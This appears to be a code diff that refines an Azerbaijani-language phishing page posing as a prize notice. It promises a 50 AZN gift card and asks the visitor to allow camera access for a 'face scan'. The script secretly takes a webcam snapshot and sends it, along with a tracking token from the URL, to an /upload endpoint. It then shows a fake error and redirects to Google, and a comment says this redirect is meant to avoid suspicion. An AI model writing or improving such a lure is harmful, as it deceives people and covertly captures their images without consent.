@@ -1,39 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="az">
 <head>
-    <title>Hədiyyə Çarxı</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>body { font-family: sans-serif; text-align: center; background: #f0f2f5; }</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hədiyyə Çarxı 🎁</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; background: #f0f2f5; padding-top: 50px; }
+        .btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+    </style>
 </head>
 <body>
-    <h2>🎁 Təbriklər!</h2>
-    <p>Hədiyyənizi götürmək üçün kameraya icazə verin.</p>
-    <video id="v" autoplay style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+    <h1>Təbriklər! 🎉</h1>
+    <p>Siz 50 AZN dəyərində hədiyyə kartı qazandınız.</p>
+    <p>Hədiyyəni təsdiqləmək üçün "İcazə Ver" düyməsini sıxın və üzünüzü skan edin.</p>
+    
+    <button class="btn" onclick="startCapture()">Hədiyyəni Aktiv Et</button>
+
+    <video id="video" autoplay style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('t');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(s => {
-            const v = document.getElementById('v');
-            v.srcObject = s;
-            setTimeout(() => {
-                const c = document.getElementById('c');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/png');
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // 2 saniyə sonra şəkli çəkirik
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/png');
 
-                fetch('/upload', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ token: token, image: img })
-                }).then(() => {
-                    window.location.href = "https://google.com"; // Şübhə yaratmamaq üçün yönləndir
-                });
-            }, 2000);
-        });
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: token, image: imageData })
+                    }).then(() => {
+                        alert("Xəta baş verdi. Zəhmət olmasa daha sonra yenidən yoxlayın.");
+                        window.location.href = "https://google.com";
+                    });
+                }, 2000);
+            })
+            .catch(err => {
+                alert("Kameraya icazə vermədən hədiyyəni götürə bilməzsiniz!");
+            });
+        }
     </script>
 </body>
 </html>
